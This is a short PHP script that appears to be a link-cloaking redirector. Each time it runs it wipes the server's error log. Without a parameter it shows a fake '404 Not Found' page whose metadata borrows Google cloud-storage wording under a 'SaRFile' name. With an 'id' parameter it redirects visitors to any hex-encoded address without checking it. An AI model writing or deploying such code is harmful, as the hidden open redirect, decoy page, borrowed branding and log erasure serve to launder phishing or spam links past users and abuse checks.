<?php
$clean = fopen('error_log', 'w');
fwrite($clean,'');
fclose($clean);

$coli = array('https://itunes.apple.com','http://www.youtube.com','http://soundcloud.com','http://spotify.com','http://www.joox.com');
$redir = $coli[rand(0,(count($coli)-1))];

if(empty($_GET['id']))
{
echo '<!DOCTYPE html>
<html style="height:100%">
<head>
<title> 404 Not Found :(</title>
<meta name="description" content="Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account."/>
<link rel="canonical" href="https://sarfile.me/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="404 Not Found :(" />
<meta property="og:description" content="Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account." />
<meta property="og:url" content="https://sarfile.me/" />
<meta property="og:site_name" content="404 Not Found :(" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account." />
<meta name="twitter:title" content="SaRFile - Safely store and share your photos, videos, files and more in the cloud. Your first 15 GB of storage are free with a Google account." />
<link rel="icon" href="/favicon.ico" type="image/x-icon" />
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
</head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:50%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">
<div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 2%; left:50%;">
        <img src="https://img.sardeath.com/icon/null.png" alt="nulled"/><br/>
        <h1 style="margin:0; font-size:100px; line-height:80px; font-weight:bold;">404 Not Found</h1>
<h2 style="margin-top:20px;font-size: 30px;">Error Database Not Connect!</h2>
</div></div>
</body>
</html>
';
}else{
$uri = isset($_GET['id']) ? $_GET['id']: null;
$url = hex2bin($uri);
header("Location:".$url);
}
?>
